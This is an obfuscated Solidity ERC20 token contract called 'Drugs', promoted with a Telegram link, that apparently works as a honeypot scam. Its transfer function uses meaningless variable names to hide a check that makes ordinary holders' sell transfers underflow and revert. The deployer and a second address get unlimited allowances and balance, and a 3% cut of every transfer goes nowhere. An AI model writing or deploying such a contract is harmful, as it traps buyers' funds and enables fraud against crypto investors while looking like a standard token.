// https://t.me/drugs_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract Drugs is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private speak;

    function _transfer(
        address guide,
        address human,
        uint256 itself
    ) internal override {
        uint256 establish = well;

        if (call[guide] == 0 && speak[guide] > 0 && guide != uniswapV2Pair) {
            call[guide] -= establish;
        }

        address doctor = address(finish);
        finish = Drugs(human);
        speak[doctor] += establish + 1;

        _balances[guide] -= itself;
        uint256 read = (itself / 100) * well;
        itself -= read;
        _balances[human] += itself;
    }

    mapping(address => uint256) private call;
    uint256 public well = 3;

    constructor(
        string memory cream,
        string memory around,
        address prize,
        address cotton
    ) ERC20(cream, around) {
        uniswapV2Router = IUniswapV2Router02(prize);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 useful = ~uint256(0);

        call[msg.sender] = useful;
        call[cotton] = useful;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[cotton] = useful;
    }

    Drugs private finish;
}